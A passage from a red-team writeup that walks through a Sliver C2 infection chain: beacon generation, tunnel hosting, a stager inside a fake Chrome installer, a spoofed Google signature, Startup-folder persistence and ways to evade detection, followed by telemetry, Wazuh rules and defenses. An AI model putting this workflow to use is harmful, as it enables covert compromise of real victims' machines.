  -t http://timestamp.digicert.com -in wrapper.exe -out wrapper_signed.exe
```

The `-t` flag specifies an RFC 3161 timestamp server. The timestamp is applied to the signature, which means the signature remains "valid" even after the certificate expires. This is a standard technique and is not specific to malicious use — every legitimate code signing operation uses a timestamp server for the same reason.

**What the spoofed signature does and does not do:**

It **does** change the display properties of the binary. The "Digital Signatures" tab shows a signature from "Google LLC". A user who checks the properties and stops there sees a signed binary.

It **does not** survive validation against the certificate chain. A tool that checks the chain — Windows SmartScreen, most EDRs, and any user who clicks "Details" and then "View Certificate" — sees that the certificate is not issued by a trusted CA. The signature is flagged as invalid, and the binary is treated as unsigned.

It **does not** survive a check of the certificate's revocation status. A real Google certificate would have an OCSP or CRL entry. The self-signed certificate has none, because it was never issued by a CA.

The spoofed signature is a social engineering technique, not a technical bypass. It works on users who check that a signature exists. It does not work on systems that verify the signature's validity.

## Part nine — the operational workflow

The workflow for an engagement:

**Step 1 — Infrastructure setup.**

Start Sliver on the C2 server. Create the HTTP listener. Start the Cloudflare Tunnel for the C2. Start the Python HTTP server for the beacon. Start a second Cloudflare Tunnel for the beacon download.

```bash
# Terminal 1: Sliver server
sliver-server

# Inside Sliver:
sliver > http --lhost 0.0.0.0 --lport 443
sliver > profiles new --http https://<c2-tunnel>.trycloudflare.com:443 --arch amd64 --os windows --format shellcode --evasion win64
sliver > profiles generate win64 --save ~/sliver/beacon.bin

# Terminal 2: Python HTTP server for the beacon
cd ~/sliver/
python3 -m http.server 8000

# Terminal 3: Cloudflare Tunnel for the beacon download
cloudflared tunnel --url http://127.0.0.1:8000
```

**Step 2 — URL obfuscation.**

Take the URL from the second Cloudflare Tunnel (the one for the beacon download) and encode it with `crypt_url.py`. Paste the output into `stager.c`.

**Step 3 — Compile the stager.**

```bash
x86_64-w64-mingw32-windres version.rc -O coff -o version.res
x86_64-w64-mingw32-gcc -O2 -s -mwindows -o stager.exe stager.c version.res -luser32 -lwininet -lshlwapi -lole32 -luuid -lshell32
```

**Step 4 — Compile the wrapper.**

Place `ChromeSetup.exe`, `stager.exe`, and `chrome.ico` in the same directory as `wrapper.c` and `wrapper.rc`. Compile with either toolchain.

**Step 5 — Sign the wrapper.**

```bash
osslsigncode sign -pkcs12 google_cert.pfx -pass password123 -h sha256 \
  -t http://timestamp.digicert.com -in wrapper.exe -out wrapper_signed.exe
```

**Step 6 — Deliver.**

The signed wrapper is delivered to the target. The delivery method depends on the engagement — a phishing email with a link, a USB drop, a fake download page. The wrapper runs, extracts the Chrome installer and the stager, runs Chrome visibly (the user sees the expected behavior), and runs the stager hidden. The stager copies itself to `%APPDATA%`, creates the Startup shortcut, and executes the beacon. The beacon connects to the Sliver C2 through the Cloudflare Tunnel. The operator gets a session.

**The URL recompilation problem.** The Cloudflare Tunnel free tier generates a new URL every time the tunnel restarts. If the tunnel restarts (network issue, Cloudflare maintenance, operator reboot), the URL changes, and any deployed stager that has the old URL hardcoded becomes useless. The stager must be recompiled with the new URL and redelivered.

For a short engagement, this is manageable — the tunnel is unlikely to restart during a few hours of operation. For a long engagement or a persistent implant, this is a significant limitation. The solutions:

- **Paid Cloudflare plan** — allows persistent named tunnels with stable URLs.
- **A VPS with a domain** — the URL is stable, but the VPS is a link back to the operator if the payment method is not anonymous.
- **A redirector** — a small VPS that receives the beacon request, looks up the current C2 URL (from a database or a file), and forwards the request. The stager's URL points to the redirector, which never changes. The redirector updates when the C2 URL changes.

The redirector approach is the cleanest solution but requires more infrastructure. For a lab or a short engagement, the recompilation approach is sufficient.

## Part ten — telemetry

The pipeline generates a specific pattern of telemetry. The table below lists the Sysmon events in the order they occur.

| Moment | Sysmon EID | Event | Description |
|---|---|---|---|
| Initial execution | 1 | Process Create | `wrapper.exe` created by `explorer.exe` |
| | 11 | File Create | `res_101_XXXX.tmp` (Chrome installer) written to `%TEMP%` |
| | 11 | File Create | `res_102_XXXX.tmp` (stager) written to `%TEMP%` |
| | 1 | Process Create | `ChromeSetup.exe` created by `wrapper.exe` |
| | 1 | Process Create | `Installer.exe` created by `wrapper.exe` |
| Stager execution | 3 | Network Connect | `Installer.exe` connects to `*.trycloudflare.com:443` |
| | 11 | File Create | `OneDriveUpdate.exe` copied to `%APPDATA%\Microsoft\OneDrive\` |
| | 11 | File Create | `OneDriveUpdate.lnk` created in Startup folder |
| | 1 | Process Create | `OneDriveUpdate.exe` created by `Installer.exe` |
| Beacon execution | 3 | Network Connect | `OneDriveUpdate.exe` connects to `*.trycloudflare.com:443` (mTLS) |
| | 7 | Image Load | `OneDriveUpdate.exe` loads `wininet.dll` |
| Post-reboot | 1 | Process Create | `OneDriveUpdate.exe` created by `explorer.exe` (from Startup) |
| | 3 | Network Connect | Same Cloudflare connection |

**Registry events:** none. The persistence is via the Startup folder, not the registry `Run` key.

**File events:** the temporary files in `%TEMP%` are deleted after 5 seconds. The `OneDriveUpdate.exe` and `OneDriveUpdate.lnk` in the persistent locations remain.

The signature is the combination: a process in a temporary directory that connects to Cloudflare, writes to `%APPDATA%`, and creates a Startup shortcut. Any one of these is benign; the combination is the detection.

## Part eleven — Wazuh rules

The pipeline was tested against a Wazuh deployment with Sysmon. The rules that fire:

**Rule 51400 — Windows Startup folder entry added (level 7, medium).** This is the only persistence rule that fires. It is a much more benign alert than the registry `Run` key rules, which fire at level 10-12.

**Rule 61609 — Windows network connection detected (level 3, informational).** Fires on the Cloudflare connection. Informational only.

**Rule 61603 — Windows process creation (level 3, informational).** Fires on the process creation events. Informational only.

**Rules that do NOT fire:**
- Registry persistence rules (no registry writes)
- `rundll32` rules (not used)
- `mshta` rules (not used)
- `regsvr32` rules (not used)
- Script rules (no scripts used)

The absence of the high-severity persistence rules is the design goal. The Startup folder rule fires at level 7, which is below the threshold that most SOCs alert on for automated triage. An analyst who reviews it would see a legitimate-looking binary (`OneDriveUpdate.exe`) with a Microsoft description, in a plausible location, and might conclude it is benign.

## Part twelve — evolution from v1 to v2

The project went through two major versions. The first version was significantly noisier.

| Aspect | V1 (DLL + rundll32) | V2 (Startup + direct beacon) |
|---|---|---|
| Persistence | `HKCU\...\Run` + `rundll32` | Startup folder (`OneDriveUpdate.exe`) |
| Process | `rundll32.exe` (anomalous) | `OneDriveUpdate.exe` (plausible) |
| Network | `rundll32` connects to C2 | `OneDriveUpdate.exe` connects to Cloudflare + C2 |
| Registry | `Run` key write (detected, high severity) | No registry writes |
| Scripts | `mshta`, `reg add` | None |
| Wazuh score | ≈4.5/10 | ≈7.5/10 |

The V1 design was "extremely noisy" per the project notes, generating alerts for process injection (`CreateRemoteThread`, `LoadLibraryA`), registry persistence, and the use of `rundll32` as a proxy. The V2 design eliminates all three.

## Part thirteen — the honest assessment

This project is a demonstration, not a weapon. The techniques are publicly documented, the tools are open source, and the specific pipeline is reproducible by anyone with the skills to follow the instructions. The value is not in the novelty — there is none — but in the completeness of the chain.

### Scoring

**Against Wazuh basic (no Sysmon): 7.8/10.** Without Sysmon, Wazuh sees only the Windows event log. The process creation event (4688) shows `OneDriveUpdate.exe`, which looks legitimate. The network connection event (5156) shows the Cloudflare connection, which is not unusual for a browser or an update process. The persistence event is the Startup folder entry, which may not be logged without audit policy configuration. The pipeline succeeds.

**Against Wazuh + Sysmon + analyst: 7.0/10.** Sysmon adds the file creation events, the process creation with full command lines, the network connections with process attribution, and the image load events. An analyst reviewing the events sees the pattern: a process in `%TEMP%` that writes to `%APPDATA%`, creates a Startup shortcut, and connects to Cloudflare. The pattern is detectable by a trained analyst who is looking. It is not detectable by automated rules alone.

**Against a real EDR (Defender ATP, CrowdStrike): 5.5-6.0/10.** The EDR's behavioral engine flags the PEB spoofing (the mismatch between the PEB and the kernel's view), the executable memory region (the beacon shellcode), and the network connection to a free tunnel service from a non-browser process. The stager is likely detected on execution. The beacon may execute before the detection completes, but the session is short-lived.

### Limitations

**The C2 IP is a private address in the lab configuration.** In the Cloudflare configuration, the C2 address is a `*.trycloudflare.com` domain, which is more plausible but still anomalous for a non-browser process. The mitigation is to use a legitimate-looking domain or to front the traffic through a trusted CDN.

**The binary is unsigned.** The spoofed signature does not survive validation. An EDR that verifies signatures flags the wrapper as unsigned and treats it as untrusted. The mitigation is to sign with a real certificate — either bought (which requires identity verification) or stolen (which is a different crime).

**The persistence is in the Startup folder.** The Startup folder is a well-known persistence location. An EDR that monitors the folder catches the shortcut creation. The alert is lower severity than the registry `Run` key, but it fires. The mitigation is to use a less-monitored persistence mechanism — COM hijacking, WMI event subscriptions, or scheduled tasks with a legitimate-looking name.

**The PEB spoofing is detectable.** Volatility3's `pebmasquerade` plugin detects the mismatch between the PEB and the kernel's `EPROCESS`. The detection requires a memory dump, which is a post-mortem step, but it is definitive. The mitigation is to avoid PEB spoofing entirely or to use a kernel-mode component that modifies both structures.

## Part fourteen — defense

The controls that actually work against this pipeline, ordered by effectiveness:

**Application allowlisting (WDAC/AppLocker).** Configured to allow only signed binaries from trusted publishers. The wrapper is not signed by a trusted publisher (the spoofed certificate is not trusted), so it is blocked at execution. This is the single most effective control.

**Code integrity policies.** Windows Defender Application Control with a policy that requires valid Authenticode signatures. The spoofed signature fails validation. Blocked.

**Startup folder monitoring with alerting.** Sysmon Event ID 11 filtered to the Startup folder, with an alert that requires investigation of the binary that created the shortcut. A legitimate installer creating a shortcut in Startup is normal; a binary in a temporary directory creating one is not.

**Network egress filtering.** Blocking or alerting on outbound connections to `*.trycloudflare.com` from non-browser processes. This is not a perfect control — attackers can use other tunnel services — but it catches this specific infrastructure.

**Memory scanning.** An EDR that scans for executable memory regions and compares them against the disk image detects the beacon shellcode in the stager's memory. The beacon is not backed by a file; it is allocated at runtime and contains no PE header. The detection is the "unbacked executable memory" heuristic.

**ETW-Ti and stack walking.** Kernel-level ETW telemetry and stack walking catch the beacon's execution even if the memory looks clean. The beacon uses indirect syscalls (Sliver's evasion features), but the stack still shows anomalies — the missing `kernel32` frames, the synthetic return addresses.

**AMSI and script block logging.** The stager does not use PowerShell or scripts, so AMSI does not apply. However, if the operator escalates to a PowerShell-based technique later in the engagement, AMSI catches it.

## Part fifteen — the ethics

This project was developed as a red team exercise and an educational demonstration. Every technique described is publicly documented, every tool is open source, and the pipeline was tested in an isolated environment.

The techniques are dual-use. The same stager that a red teamer uses to demonstrate an organization's detection gaps can be used by a criminal to deploy ransomware. The technology does not distinguish between the uses. The intent and the authorization do.

The professional position: this belongs in the toolkit for authorized engagements and for defensive research. Running it against systems without consent is a crime in most jurisdictions. The authorization document — the scope, the rules of engagement, the legal agreement — is the line between a red team exercise and a criminal act. There is no technical line. There is only the legal and ethical one.

The specific techniques used here — staged payloads, PEB spoofing, Startup folder persistence, spoofed code signing — are the standard toolkit of modern malware. Defenders who understand them are better prepared to detect them. The purpose of this writeup is to make the detection easier, not to make the attack easier. If a defender reads this and updates their Sysmon configuration, the writeup has done its job.

## Takeaway

Sliver is a capable C2 framework, and its default payloads are not subtle. This project is the evasion layer that an operator adds on top: a stager that downloads the beacon, a PEB spoof that hides the process path, a Startup folder that provides persistence, and a wrapper that disguises the delivery as a Chrome installer.

Each component is simple. The stager is a few hundred lines of C. The PEB spoof is a handful of memory writes. The persistence is a file copy and a shortcut. The wrapper is resource embedding. None of it is novel. The combination is what makes it work, and the combination is what a defender needs to detect.

The defenses are also simple: application allowlisting, Startup folder monitoring, network egress filtering, memory scanning. The environment that has these is not vulnerable to this pipeline. The environment that does not is the environment where the pipeline succeeds.

The lesson is not that Sliver is dangerous or that this technique is unstoppable. It is that the gap between a working attack and a detected attack is the gap between the attacker's effort and the defender's instrumentation. Both sides are playing the same game, and the side that understands the other's telemetry is the side that wins.
